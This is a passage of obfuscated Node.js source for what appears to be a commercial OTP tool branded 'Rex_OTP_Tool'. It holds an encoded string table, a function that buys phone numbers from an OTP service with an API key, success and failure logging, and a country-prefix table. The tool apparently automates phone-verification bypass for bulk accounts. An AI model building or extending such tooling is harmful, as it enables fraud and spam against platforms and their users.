'kfGXmq', 'CIbmyq', 'C2vYDG', 'qLPKDq', 'DxfjAG', 'uenpuq', 'tKHRwq', 'Dxz4AW', 'BNrSEq', 'AKjjyW', 'Dcbjua', 'ks4Grq', 'teLdia', 'zsbZDq', 'Aw4GBa', 'q05gza', 'mtyYna', 'twvYCW', 'tuDnCG', 'v0Leia', 'CKLKoW', 'ru1xtW', 'r0Lhta', 'pue/qG', 'su5eza', 'z2XVyG', 'oc1hqW', 'iZaWqG', 'vevIzq', 'B21L', 'lIbuyq', 'r0rUsa', 'zhv5qG', 'ywn0Aq', 'AM9PBG', 'y2vJDq', 'su1kvW', 'nNW0Fa', 'ntaWma', 'x3WGFa', 'DNfXBq', 'Dg9U', 'tMfRDq', 'uwvmqG', 'ENfJsG', 'Aw5Nza', 'y05IqW', 'yLfpBG', 'mJyZnJy3nZbnrKXSwLi', 'DwX0CG', 'qu5ZEG', 'EvnRzq', 'FcbLyW', 'whzjwa', 'wu1itG', 'z3jouq', 'mtbFmq', 'oYbmAq', 'u3jPia', 'C2v0lq', 'vKP2sq', 'uhjLDa', 'BKDIva', 'EwvHCG', 'A25PBq', 'zLrqwq', 'Awq7ia', 'zcbMBW', 'Ag90Bq', 'wKDzuq', 'ifrPBq', 'igDLDa', 'rcbiqq', 'yKj6AG', 'A0DkuG', 'Bevwva', 'ywLSCW', 'wfbZvW', 'y2GGuW', 'B3v0lG', 'mtiWnq', 'zY50Ea', 't09ACG', 'qvbjia', 'zgfYwq', 'kgrLzG', 'ExH4sG', 'D2HPDa', 'qNjPCW', 'DMftyG', 'qvjkqG', 'y2vLnG', 'mti4xW', 'AgfYCG', 'zvPgCa', 'zMXPzW', 'vePqEG', 'vwDNvG', 'kZi1nG', '4PYtifrO', 'q0DjvG', 'CNmGyq', 'q2vUDa', 'wNrHrW', 'EfbJqq', 'jtiYka', 'qNPTtG', 'sxDzAa', 'DeXjsa', 'D0Hbrq', 'AKXzva', 'sNDqAa', 'rNjLzq', 'B24TBa', 'u3bLyW', 'tfPcsW', 'rhztCW', 'Awv3za', 'zxf1Aq', 'x3bYBW', 'yw5Kia', 'u0zLBq', 'wfvOvW', 'DgvZ', 'Aw5WDq', 'EfD1zW', 'icHiva', 'BYbWyq', 'vNbrzW', 'BYbPBG', 'svHoBq', 'D2f0Aa', 'ALPjrq', 'uKPUua', 'DgvZDa', 'zKf1va', 'twfSAq', 'wfforq', 'Aw9U', 'Aw5NAa', 'Bg9Jyq', 'BMrPlq', 'EKHJra', 'y29TCa', 'Aw5PDa', 'vwfTsG', 'mZaWma', 'C29Yia', 'BLHvAG', 'qw5Kzq', 'rhrTza', 'B1vVBq', 'twfUyW', 'CfzWCW', 'CfPwDa', 'CvnIsG', 'qIu3ra', 'r1DREG', 'BMuGBG', 'ucbbua', 'ue96wa', 'Be51Bq', 'zeX3sa', 'rwTksG', 'zxjZlW', 'v2jyqG', 'uhLIyq', 'mMiTCG', 'sLDJCG', 'u2XLuq', 'q29SBW', 'ywn5qq', 'Bsi7DG', 'BIbWAq', 'zKL0sa', 'zxnZBW', 'D1Hztq', 'qu9cwG', 'zhbmBG', 'Dxz3Ea', 'yunKBa', 'AKPwwq', 'BMvUDa', 'q291BG', 'ChHUwG', 'rhfgBW', 'CLP6Aq', 'DgfNBW', 'q29lzW', 'uevsuW', 'wefcwa', 'vMrttq', 'lxPblq', 'CMvHza', 'q0TPrW', 'lJiGia', 'u2T6wq', 'EenIEq', 'Dgv1tW', 'FdH8nq', 'wwfyza', 'EhDYBq', 'q0DLsa', 'ExnPyq', 'DMLSBa', 'BgvZ', 'BcbKzq', 'AejKsG', 'DgnfwG', 'oxW3Fa', 'ifvoqq', 'rvnFmG', 'sKLgCG', 'zxj3zG', 'o0e9qG', 'jtiYyq', 'mJm0mq', 'CMvKDq', 'q1vAua', 'sgjJvW', 'uxnHva', 'DhvYzq', 'A0zhzq', 'tfnFqq', 'AMfJAW', 'mtqW', 'wejqwq', 'zxqGra', 'BwuGka', 'FdiUma', 'u2LNBG', 'ELb6rG', 'BgL6Aq', 'rxH0CG', 'v2LSCW', 'EK1HzW', 'uMvNAq', 'vurTEG', 'uhvUzq', 'Awndva', 'C29YDa', 'zsb8ia', 'z293', 'ts1tsa', 'CMvkzG', 'zxb0zq', 'AhzWuW', 'ELH4Da', 'seXQsq', 'qxf2AW', 'yMPoEa', 'ugvYCW', 'wgnREq', 'AMjNwa', 'mtm3lG', 'mtqY', 'iejLBG', 'uNnQuG', '8j+tGsbmBW', 'B3iGAq', 'Eunbva', 'rgLrrq', 'iJT2pq', 'ug9lrG', 'DwHXBq', 'ihbYzq', 'rgLQvW', 'BNnLia', 'BwfPBG', 'Euf6rG', 'ls0Tlq', 'DMvKia', 'EwTgvq', 'zMXVBW', 'zwPMyW', 'rK9Svq', 'zxr1Ca', 'm0eLnq', 'cIaG4PYx', 'odK5nq', 'vvritW', 'BYbZDq', 'DgvPBG', 'ibTBoq', 'q1L4AG', 'DMPxBq', 'q2vKyq', 'rhrYBG', 'C29MDa', 'vujWyq', 'z1HnqG', 'CYbtDa', 'BMCGyq', 'q2HPDa', 'wKn6Aa', 'mJjZAq', 'tfPAsW', 'BMLUzW', 't2nxtq', 'B3bV', 'uMf3yq', 'AxjZDa', 'surnBq', 'Bvjyrq', 'qxjRsa', 'iKnOCG', 'Dg5wAG', 'BcbHBa', 'AMfMuq', 'tLqXma', 'zM9Yrq', 'B2z0ia', 'CMvXDq', 'BgXPBG', 'qKHQrG', '4PscifVIGki', 'v0PIwG', 'CMfNzq', 'CIbqAa', 'y2HYAq', 'ndqWma', 't1rqoG', 'DwnJzq', 'q293qG', 'zsbWCG', 'y2vjra', 'uwTTAW', 'l0ePqG', 'DMLZAq', 'lM5LEa', 'DMDKyW', 'C2LNBG', 'rKzg', 'r2HHBG', 'l3bPBG', 'vuT6qG', 'C21HCG', 'ihbOBW', 'rfzvrW', 'vhvUAq', 'v2fZAa', 'Aw5ZDa', 'sNbstq', 'AwXL', 'B0rrrG', 's2L0lW', 'ievKzW', 'AcblBW', 'DgvYlW', 'zNjjDa', 'Bezksq', 'EuL4vG', 'y2fSyq', 'Cu1jBq', 'yxbvtG', 'sxP2rW', 'CgXwrq', 'BKn4Bq', 'DxfKrG', 's3DRCq', 'u2nVDa', 'Aeziwq', 'Bgvtsq', 'qMThBG', 'y1DWAW', 'sgLSBa', 'zxiG', 'yxHotq', 'Ag8GiG', 'C3bSAq', 'rgvSzq', 'zxaLmG', 'CvHPtW', 'lxnLCW', 'zw4Tvq', 'Dg90yq', 's2fYBG', 'EMP0zq', 'BvbhvG', 'DhPiDa', 'Cu1oqq', 'DgvJDa', 'q25ztq', 'ieLUDG', 'C3rYAq', '4PYtieXV', 'Bcu1ra', 'swzKvq', 'DfnAza', 'rKnuia', 'y2HHAq', 'zhbNza', 'AvztAa', 'B29iqq', 'ruX6qG', 'icdILze', 'CwvJuW', 'zfHyzq', 'uwTrrG', 'ig51Bq', 'DxbKyq', 'mNWZFa', 'C2HHCG', 'ywXRsG', 't19uta', 'q0jmDa', 'yvrsvG', 'kZuY', 'DffRsq', 'kZyW', 'yuvOCq', 'qNjVDW', 'EgL0Aq', 'zgf2Aq', 'C2HPzG', 'y2XPva', 'AxrPyq', 'kYKRkq', 'zfzmAW', 'qvrWzq', 'mtiXma', 'zxDQra', 'q01Psa', 'DxzRta', 'rLv1tG', 'BNnSyq', 'm2eXoa', 'ExLWDa', 'CY1WCG', 'Cgfkzq', 'zM9tqW', 'CMLH', 'BwfW', 'mJaWma', 'B0viva', 'wLztAa', 'DKf0AW', 'ChjPDG', 'sgTpBq', 'whrfrW', 'zc4BwW', 'mMu3mG', 'Ag5ysa', 'B25H', 'B21vvq', 'DxaGzG', 'vefMvG', 'qLrbsG', 'twzwBW', 'ywLKzq', 'AMjxCG', 'mZaYma', 'B1LxtW', 'ne5tta', 'C3fyCW', 'DxndAq', 'CfjpCG', 'BMrP', 'ugHVzq', 'ks4Gvq', 'v2nryq', 't09owa', 'ignVBG', 'qMrcyW', 'kZu3', 'wvreza', 'ww55qW', 't2Lsva', 'AxvTia', 'CefhuG', 'vfP3Ea', 'zYbZzq', 'kf8Pia', 'zKTMqG', 'uuPKsG', 'Dg1Nyq', 'DeTSyG', 'ogyZmG', 'rKrOsa', 'tNjsra', 'AgDIvW', 'r0H2CG', 'CMuGua', 'ruTtra', 'o3e9ma', 'zxjNBW', 'rgvWzq', 'ugrIvW', 'qNr0AW', 'tdOGsq', 'CMHdDG', 'DLjREG', 'C2SGlq', 'icaG4PYx', 'yKTcwa', 'kZG0', 'BMfSlq', 'mZa1xW', 'wKfLwG', 's3z2Dq', 'shHJva', 'ihn1yW', 'y3Hiyq', 'serpDq', 'mtq5', 'DMfSDq', 'uML6rW', 'AgvHza', 'AvvXrG', 's3Dwvq', 'ifjLzW', 's2v5ia', 'CMvMBW', 'vgvkBq', 'vgHHAq', 'yMfUBG', 'q29UzG', 'veD0sW', 'v3HXuG', 'uxvLEG', 'DMfS', 'uMTJvG', 'DgfSBa', 'yNjVDa', 'Ae10tq', 'yLr6sq', 'yNL0zq', 'ywrHBq', 'wvDPyW', 'AwH1Aa', 'vLLZzW', 'vKrlra', 'tM9YDW', 'wwjACG', 'vg1OyG', 'BunxuG', 'lIbqBa', 'D1j5zW', 'CYbgAq', 'EM9iEG', 'B3qGzW', 'zgfUAq', 'ugrfwa', 'u0TgAW', 'wxHlCa', 'qwn1Aq', 'z0XqBG', 'rNnorG', 'Acbxyq', 'wLnWzG', 't2LzAq', 'uMfIqq', 'AejoyW', 'Dg9Rzq', 'uLPgvq', 'CwXsra', 'CMP1BW', 'ifjVyq', 'D0Dvtq', 'vMLVrW', 'ihWGFa', 'AhDPza', 'B3ffsW', 'uvLesW', 'ke1HyW', 'sg91CW', 'Ag5QDG', 'y29VAW', 'v1j5CG', 'AhrwrG', 't0zuvW', 'A2vWwq', 'rgvMyq', 'AhLHtW', 'EwfOBW', 'BMz4', 'CNHfzW', 'B29RlG', 'oIbnAq', 'Bxb5uq', 'rhj3vq', 'qJzc', 'sKfprq', 'zMnHta', 'u19dsa', 'Dw5SAq', 'ugDRsW', 's0v2sW', 't0nSDG', 'ksGGkq', 'qsu1qG', 'Fcb8ia', 'sw5KBW', 'l3yXlW', 'sNj1Ba', 'EMfIzq', 'tg9Uza', 'Dg9Y', 'ifnLCW', 'C2v0Da', 'Aw5L', 'mdeTnq', 'CMfUza', 'twjiAG', 'ChjVEa', 'wZuVnq', 'zLHIvq', 'twfWBa', 'r3vSDq', 'Cg50va', 'sfnIyW', 'C2uGyW', 'vg94Da', 'ienVDq', 'zw5K', 'BhPAsa', 'rgf2yq', 'rNvUza', 'iKXPBG', 'EsbZyq', 'ugjIBa', 's0HlvW', 'qNb1yG', 'u0vora', 'mKmLnW', 'rNPIvW', 'vMLJDa', 'tgLTCa', 'zLDMEq', 'EK1YAW', 'AgvYBG', 'z2jLtW', 'B3Dttq', 'twDytW', 'yxzosa', 'thLJza', 'CMvSzq', 'zgTcra', 'ifbvqG', 'Duntzq', 'rwfosq', 'BMDPzG', 'rviGlq', 'q0Trsa', '4PYxifnH', 'swPKqq', 'tLDjuW', 'C3vJyW', 'zw1WBa', 'C3rLDG', 'ExrPvG', 'wevsAq', 'DxrMoa', 'r2XHCW', 'CIbUzq', '4PYtienV', 'CNnOzq', 'BgLUzq', 'txLHBG', 'zxnZzq', 'sfj3zG', 'u1nmxW', 'ns4WiG', 'BMf1Da', 'rgfUAq', 'AKvyDW', 'vMLIta', 'rMrTDq', 'lYbbyW', 'r2zrua', 'CxvLDq', 'DhH0xq', 'quniqq', 'r2f6Aq', 'tKLjCq', 'mZyGka', 'pufFqG', 'ms1Yzq', 'D2fYzq', 'oIb0lG', 'u0rdsG', 'y2TZlq', 'CfL3Cq', 'vJiUma', 'AunrsW', 'nZaWma', 'wwjyEa', 'sMfPCa', 'sgjPCG', 'yxnH', 'txz4qq', 'CK95DW', 'BfLWwa', 'D0jOwa', 'sKPdCG', 'BwTkqq', 'BvPZDG', 'C3qGCa', 'xsbtDa', 'sgfYza', 'tLfovG', 'yxnZoG', 'AxmGyW', 'wMnfuq', 'B3jPyq', 'z0jQsG', 'Bwvtzq', 'CejIvG', 'yMzoAa', 'nhW1Fa', 'qundtW', 'BMrZ', 'Cw5bqG', 'vujmsq', 'zwv0', 'AgvUDa', 't2nXBW', 'qwfpsa', 'tNjAvq', 'u3ruuG', 'yKHUCG', 'r0Hfza', 'suTHqq', 'mtm5', 'EMLSBa', 'rgvUBq', 'zwqGAW', 'vgLTzq', 'yw5Kzq', 'CuPkDG', 'BgTNBa', 'zxLZAq', 'icdILztILza', 'rgTZqW', 'qxnOyq', 'oxWWFa', 'CgLWzq', 'A3vqAq', 'zw50zq', 'uM1ouW', 'DLzwyq', 'ievSAq', 'zwzNAa', 'DcdIHPiG', 'AwvZlG', 'D3zbsG', 'Evjvzq', 'sM9Oyq', 'ueHVvq', 'Aw1jBG', 'lxnZAq', 'CIbozq', 'yvzWqG', 'ic8GxW', 'CNHhsW', 'Cgf1CW', 'BMfSia', 'AgHpsG', 'zxqGyq', 'sMT1CG', 'wxfjtq', 'CKjjtW', 'quH1ta', 'ChbtAq', 'svLQzW', 'CM95yq', 'vMjqtG', 'A2v5Ca', 's2fYyq', 'DguGCW', 'qvvmzW', 'wZmVnq', 'zw50lq', 'zhb5ra', 'qMTqta', 'zwqGCW', 'zxnZpW', 'wvbgzq', 'rvmXmG', 'uhL2sq', 'rhfVAa', 'yMLSzq', 'v2LSBa', 'q2HYBW', 'u0nsqq', 'AgnvBa', 'EuLjvG', 'wg5SrW', 'AwnHDa', 'CxDura', 'qKzotW', 'Ff8GxW', 'whjnta', 'rhDJAW', 'q05tsa', 'oI8V', 'v2vZDa', 'y3LHBG', 'wNfyCG', 'y2HPBa', 'yvjXsq', 'Egfrva', 'qLmXia', 'ksbbCa', 'CNDpwG', 't3vtqW', 'BeTgAa', 'sMjJEq', 'ie5Via', 'DwX0kq', 'rgDWEq', 'yw9SlG', 'wL8Kxq', 'tMnrsW', 'mdeWma', 'DfHsvq', 'BMnKDG', 'ug9Syq', 'qNLmBW', 'BgWLmG', 'zwn0', 'wxvVCq', 'BMnL', 're9dyq', 'iIWG', 'ruDWzG', 'D29Yza', 'cI0Tlq', 'igzHAq', 'BgzUqW', 'v1HQCa', 't1rqia', 'DefiyW', 'D2LSCW', 'DLPpsa', 'wwPQBW', 'A2v5ia', 'u0vuvq', 'BNrZ', 'ifDPBG', 'C3rVyW', 'EffpBW', 'wuLttq', 'g1SYsW', 'thbzyG', 'zMf1Ba', 'C2HHmG', 'ihrVia', 'BNrhCG', 'ifGG', 'zgv0zq', 'yZfLmW', 'ugTfEG', 'vK5yvW', 'zwzozG', 'wKHqzW', 'Ee1gvq', 'vgfZBq', 'tgfVCW', 'mtb8ma', 'ifrPDa', 'mIuYqW', 'twfUAq', 'CNbVBW', 'DNDbwq', 'ywnOAq', 'FhrPDa', 'mJjZDa', 'sNPoyq', 'Dw5RAa', 'yLDuyq', 'tM51vW', 'ienVyq', 'mtu2yq', 'zsboBW', 'B3rWCW', 'z1nxsG', 'qM9ZDa', 'vNrVvW', 'DfrutW', 'uNvPDa', 'u3bHAq', 'AgLUzq', 'B1PirG', 'DNLADa', 'vhjPzW', 'C1DpAq', 'AvHPCG', '4P6ug1SZ', 'sM9Uzq', 'tteGmq', 'rwXKBW', 'mtqX', 'DxnLCG', 'zxqTsq', 'zNrLCG', 'tMv3ia', 'qMvUAq', 'ueHVrW', 'q2LUra', 'B1LfBW', 'uhDHza', 'iuaJja', 'CM9Yia', 'qvjfxa', 'Bvztra', 't1mI', 'EfzxAq', 't29yqG', 'A05ywa', 'AxPH', 'q2H1CG', 'C3zjvG', 'EuTrAW', 'CKL4Aa', 'vwDftG', 'zdq0yW', 'mtq0', 'B0zHBG', 'vgf5Ba', 'yxr1CW', 'BwLU', 'BgvtEq', 'ywfMDq', 'EeTbra', 'zwqGsW', 'yMDftW', 'uLnAsW', 'AMfjAG', 'swXSAq', 'CMvWzq', 'zNfKyq', 'Aw5NCW', 'AwrLBG', 'CwrXuG', 'twv4Aq', 'BMCGDa', 'CgL0yq', 'ie1PEa', 'qKPHyW', 'z2vYzq', 'm2iTCG', 'EwH3zW', 'tvL0qW', 'zgLuyG', 'mZrJzq', 'uvvnva', 'sKLisa', 'sM9OBG', 'sfPRsG', 'mxWZFa', 'uxD3uW', 't2juBG', 'BMDHBG', 'vvv6zq', 'zu9IAG', 'DLjPrG', 'Dhr3Bq', 'EwvnuG', 'wLbuCq', 'B3DUia', 'BertzG', 'lsbOBW', 'kfjLCW', 'B2zUCq', 'isbqBa', 'zhLJwq', 'qNjHEG', 'q0TRtG', 'EuHcyW', 'tePtEa', 'ntu1', 'BMnVBq', 'vMr6AG', 'B3iOiG', 'CMLJyq', 's1HNsq', 'ufvOqW', 'AhjVBq', 'txv0yq', 'Awz5', 'wwzHzG', 'wwnwCG', 'kcKG', 'CYbSBW', 'rgv2Aq', 'iZG4oa', 'DeLera', 'DwfNzq', 'AKjiuW', 'rLGGCG', 'kZq5', 'twLJCG', 'sMrzDq', 'DxjYzq', 'z2fS', 'zw5LCG', 'tw9TyG', 'tuHoyG', 'ChjV', 'y2zMAW', 'rYbtrq', 'tKjdEa', 'B3LTzq', 'rNrmAW', 'CMf0', 'ieLelG', 'vvjdrq', 'vfzcvq', 'yMvYCW', 'sffyvq', 'ienOCG', 'ANPUDa', 'tw9VCG', 'y3vYCG', 'AcbBza', 'Ehq/', 'rMf0yq', 'ChvYCa', 'x19qqq', 'zeTYwa', 'sLLzqG', 'iJe1lG', 'y2HPCW', 'sxjHCq', 'vvzYuq', 'ExDLAW', 'DgfYDa', 'B2Hmva', 's0rnwa', 'AgeGuG', 'ihvZzq', 'u3LSAa', 'l2fJyW', 'qvjnkq', 'u2X6ta', 'qKDJCW', 'qxjPEG', 'CgfKuW', 'BcbLCG', 'BxzSva', 'CM14Ea', 'ucbMBW', 'ywzLkq', 'AhPrDG', 'kZK3mq', 'i0zgnG', 'u3rYzq', 'EK5pqG', 'zwzHDq', 'zxjLza', 'CKDhsa', 'teTgwq', 'CxbXqW', 's1Dbuq', 'zM8GCW', 'rxPnqq', 'ttPCuW', 'DhntEq', 'mtG4lG', 'zxPmzW', 'ugfZAq', 'yxbVCG', 'FhWGka', 'B3v0', 'uuLRAG', 'Ae9dCW', 'wMPnrW', 'mZGWma', 'lI4k', 'C2n6Ba', 'AKPKDW', 'CIbPBG', 'q251Ba', 'B3DZlG', 'kue7qG', 'zwLhzW', 'r2LOBq', 'zY4k', 'Exf0vG', 'zhLpua', 'yY9JCa', 'zNH3AW', 'qMXVzq', 'BML4', 'yxbWxW', 'zLvtyq', 'icOOpW', 'mtiXnG', 'vMPkva', 'qvzWCq', 'DxLQDW', 'w0vsuG', 'mtaGva', 'Aw51zq', 'tgnduG', 'C011uq', 'uM1eqG', 'rNzHrq', 'tvD1Ba', 'yKveEG', 'tLbIvW', 'zgvIyq', 'qKThzG', 'CgjRAa', 'EeXqvq', 'uYXLBG', 'uKrIAa', 'EKP2ta', 'zvvRDG', 'BwuVCW', 'txPfwq', 'zYbbyW', 'vtDqyW', 'tuDXta', 'AM5JBq', 'q0zWDG', 'yM9ruW', 'yKTjyW', 'ExHJua', 'C3DTCW', 'vLrABW', 'r3rKzq', 'zxiLmG', 'vNjhtq', 'C0TAzG', 'BYbWCG', 'y2fW', 'y2vZCW', 'zw4Uia', 'DgLTzq', 't1vWsG', 'kZiXmG', 'y1r2DW', 'ANbLDa', 'ntqWma', 'sxL0Ba', 'AgLSza', 'zNLeEa', 'r0Hu', 's2PfAa', 'DgfS', 'y3jRyG', 'CNuGqW', 'zMfTAq', 'rLH6Eq', 'zwn0zq', 'rhfSEa', 'BNnLoG', 'wvfyua', 'Cg9SAq', 'sfzPDG', 'uLHksq', 'z2DLCG', 'rgDSEq', 'uhjVyW', 'zwnHmW', 'BwfJ', 't09Vva', 'BNjzuq', 'xY8G', 'C2LVBG', 'z3jHEq', 'veT3DG', 'vfaG', 'txv1Ea', 'zeLvzG', 'BePRra', 'mZjFta', 'CM9VBG', 'BKLHEq', 'rwvfsG', 'zw50CG', 'v1nbyW', 'rLHODG', 'CNvyBW', 'AgLZiG', 'Cfjtqq', 't0LYwa', 'zsaTqW', 'yuD0CG', 'r2vZtW', 'icbFxW', 'tg16Ea', 'u0SG4Ocu', 'ztvMyW', 's2fKDq', 'twfPBG', 'zgvZ', 'q3H1uq', 'CxvPCG', 'veTzCG', 'zMHosa', 'vgfUEG', 'tvrNqG', 'C3rHBq', 'xsbpvW', 'B0XMEa', 'DgHVBq', 'sw50zq', 'kZiYnq', 'ihrYyq', 's2LZDq', 'y1Dhuq', 'Euvbsq', 'zxi6Ca', 'v0L0BG', 'ruTpqq', 'CKP3zG', 'EtOGqq', 'y2XKrW', 'DgHYzq', 's1nxtq', 'uKvhsq', 'u3DLza', 'kZq2', 'igXPAW', 'C2TIrq', 'ifWG', 'BxvlEa', 'z2vYAq', 'u0zbtW', 'EeDvzq', 'DxDAyW', 'BgLezq', 'DxjPBG', 'rvPbEq', 'uMrrAW', 'AgfIBa', 'CNvcEq', 'id09pq', 'txDHBG', 'Aw5JBa', 'u0H0AW', 'yxDHCG', 'weTvCW', 'rfjmqG', 'thyZ', 'zxqP', 'Ae1oqG'];
  fn1 = function () {
    return v11;
  };
  return fn1();
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(v12, v13, v14) {
  return new Promise((v15, v16) => {
    {
      const v17 = {};
      v17.range = v13, v17.format = "normal";
      const v18 = JSON.stringify(v17),
        v19 = {
          'hostname': "nexaotpservice.com",
          'port': 0x50,
          'path': v14 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v12,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v18)
          }
        },
        v20 = http.request(v19, v21 => {
          {
            let v22 = '';
            v21.on("data", v23 => v22 += v23), v21.on("end", () => {
              try {
                const v24 = JSON.parse(v22);
                if (v24.success && v24.number) {
                  v15(v24.number.replace(/[^0-9]/g, ''));
                } else v16(new Error(v24.error || "NexaOTP: No number returned"));
              } catch (v25) {
                v16(new Error("NexaOTP: Invalid response"));
              }
            });
          }
        });
      v20.on("error", v26 => v16(new Error("NexaOTP network: " + v26.message))), v20.setTimeout(10000, () => {
        v20.destroy(), v16(new Error("NexaOTP: Timeout"));
      }), v20.write(v18), v20.end();
    }
  });
}
let SUCCESSFUL_FILE = "successful.txt",
  FAILED_FILE = "failed.txt",
  DEBUG_FILE = "debug.txt";
function debugLog(v27, v28, v29) {
  try {
    {
      const v30 = '[' + new Date().toISOString() + "] [" + v27 + "] [" + v28 + ']\x0a' + (typeof v29 === "string" ? v29 : JSON.stringify(v29)) + "\n---\n";
      fs.appendFileSync(DEBUG_FILE, v30);
    }
  } catch (v31) {}
}
const B = chalk.hex("#0066FF"),
  C = chalk.hex("#00BFFF"),
  Y = chalk.hex("#FFD700");
const W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B"),
  DIM = chalk.hex("#555555");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(B("   _____ _ _              ___  _____ ____  "));
    console.log(B("  |_   _(_) |_ __ _ _ __ / _ \\|_   _|  _ \\ "));
    console.log(C("    | | | | __/ _` | '_ | | | | | | | |_) |"));
    console.log(C("    | | | | || (_| | | || |_| | | | |  __/ "));
    console.log(Y("    |_| |_|\\__\\__,_|_| |_\\___/  |_| |_|    \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] OWNER      : ") + B("NOT REXY                       ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Version   : ") + Y("V2.0.2                       ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
function normalizePhoneNumber(v32) {
  let v33 = v32.replace(/[^0-9+]/g, '');
  if (!v33.startsWith('+')) v33 = '+' + v33;
  return v33;
}
function detectCountryFromPhone(v34) {
  const v35 = v34.replace(/[^0-9+]/g, ''),
    v36 = {};
  v36.prefix = "+880", v36.country = 'BD', v36.name = "Bangladesh";
  const v37 = {};
  v37.prefix = "+91", v37.country = 'IN', v37.name = "India";
  const v38 = {};
  v38.prefix = "+92", v38.country = 'PK', v38.name = "Pakistan";
  const v39 = {};
  v39.prefix = "+63", v39.country = 'PH', v39.name = "Philippines";
  const v40 = {};
  v40.prefix = "+84", v40.country = 'VN', v40.name = "Vietnam";
  const v41 = {};
  v41.prefix = "+62", v41.country = 'ID', v41.name = "Indonesia";
  const v42 = {};
  v42.prefix = "+66", v42.country = 'TH', v42.name = "Thailand";
  const v43 = {};
  v43.prefix = "+60", v43.country = 'MY', v43.name = "Malaysia";
  const v44 = {};
  v44.prefix = "+65", v44.country = 'SG', v44.name = "Singapore";
  const v45 = {};
  v45.prefix = "+86", v45.country = 'CN';
  v45.name = "China";
  const v46 = {};
  v46.prefix = "+81", v46.country = 'JP', v46.name = "Japan";
  const v47 = {};
  v47.prefix = "+82", v47.country = 'KR', v47.name = "South Korea";
  const v48 = {};
  v48.prefix = "+971", v48.country = 'AE', v48.name = "UAE";
  const v49 = {};
  v49.prefix = "+966", v49.country = 'SA', v49.name = "Saudi Arabia";
  const v50 = {};
  v50.prefix = "+90", v50.country = 'TR', v50.name = "Turkey";
  const v51 = {};
  v51.prefix = "+234", v51.country = 'NG', v51.name = "Nigeria";
  const v52 = {};
  v52.prefix = "+254", v52.country = 'KE', v52.name = "Kenya";
  const v53 = {};
  v53.prefix = "+27", v53.country = 'ZA', v53.name = "South Africa";
  const v54 = {};
  v54.prefix = "+263", v54.country = 'ZW', v54.name = "Zimbabwe";
  const v55 = {};
  v55.prefix = "+255", v55.country = 'TZ', v55.name = "Tanzania";
  const v56 = {};
  v56.prefix = "+256", v56.country = 'UG', v56.name = "Uganda";
  const v57 = {};
  v57.prefix = "+233", v57.country = 'GH', v57.name = "Ghana";
  const v58 = {};
  v58.prefix = "+237", v58.country = 'CM', v58.name = "Cameroon";
  const v59 = {};
  v59.prefix = "+225", v59.country = 'CI', v59.name = "Ivory Coast";
  const v60 = {};
  v60.prefix = "+251", v60.country = 'ET', v60.name = "Ethiopia";
  const v61 = {};
  v61.prefix = "+55", v61.country = 'BR', v61.name = "Brazil";
  const v62 = {};
  v62.prefix = "+52", v62.country = 'MX', v62.name = "Mexico";
  const v63 = {};
  v63.prefix = "+57", v63.country = 'CO', v63.name = "Colombia";
  const v64 = {};
  v64.prefix = "+56", v64.country = 'CL', v64.name = "Chile";
  const v65 = {};
  v65.prefix = "+51", v65.country = 'PE', v65.name = "Peru";
  const v66 = {};
  v66.prefix = "+54", v66.country = 'AR', v66.name = "Argentina";
  const v67 = {};
  v67.prefix = '+1', v67.country = 'US', v67.name = "United States";
  const v68 = {};
  v68.prefix = "+44", v68.country = 'GB', v68.name = "United Kingdom";
  const v69 = {};
  v69.prefix = "+61", v69.country = 'AU', v69.name = "Australia";
  const v70 = {};
  v70.prefix = "+64", v70.country = 'NZ', v70.name = "New Zealand";
  const v71 = {};
  v71.prefix = "+49", v71.country = 'DE', v71.name = "Germany";
  const v72 = {};
  v72.prefix = "+33", v72.country = 'FR', v72.name = "France";
  const v73 = {};
  v73.prefix = "+39", v73.country = 'IT', v73.name = "Italy";
  const v74 = {};
  v74.prefix = "+34", v74.country = 'ES', v74.name = "Spain";
  const v75 = {};
  v75.prefix = "+31", v75.country = 'NL', v75.name = "Netherlands";
  const v76 = {};
  v76.prefix = "+46", v76.country = 'SE', v76.name = "Sweden";
  const v77 = {};
  v77.prefix = "+47", v77.country = 'NO', v77.name = "Norway";
  const v78 = {};
  v78.prefix = "+45", v78.country = 'DK', v78.name = "Denmark";
  const v79 = {};
  v79.prefix = "+48", v79.country = 'PL', v79.name = "Poland";
  const v80 = {};
  v80.prefix = '+7', v80.country = 'RU', v80.name = "Russia";
  const v81 = {};
  v81.prefix = "+380", v81.country = 'UA', v81.name = "Ukraine";
  const v82 = {};
  v82.prefix = "+20", v82.country = 'EG', v82.name = "Egypt";
  const v83 = {};
  v83.prefix = "+98", v83.country = 'IR', v83.name = "Iran";
  const v84 = {};
  v84.prefix = "+94", v84.country = 'LK', v84.name = "Sri Lanka";
  const v85 = {};
  v85.prefix = "+977", v85.country = 'NP', v85.name = "Nepal";
  const v86 = {};
  v86.prefix = "+95", v86.country = 'MM', v86.name = "Myanmar";
  const v87 = {};
  v87.prefix = "+855", v87.country = 'KH', v87.name = "Cambodia";
  const v88 = {};
  v88.prefix = "+856", v88.country = 'LA', v88.name = "Laos";
  const v89 = {};
  v89.prefix = "+964", v89.country = 'IQ', v89.name = "Iraq";
  const v90 = {};
  v90.prefix = "+212", v90.country = 'MA', v90.name = "Morocco";
  const v91 = {};
  v91.prefix = "+216", v91.country = 'TN', v91.name = "Tunisia";
  const v92 = {};
  v92.prefix = "+213", v92.country = 'DZ', v92.name = "Algeria";
  const v93 = [v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, v56, v57, v58, v59, v60, v61, v62, v63, v64, v65, v66, v67, v68, v69, v70, v71, v72, v73, v74, v75, v76, v77, v78, v79, v80, v81, v82, v83, v84, v85, v86, v87, v88, v89, v90, v91, v92],
    v94 = v93.sort((v96, v97) => v97.prefix.length - v96.prefix.length);
  for (const v98 of v94) {
    if (v35.startsWith(v98.prefix)) {
      const v99 = {};
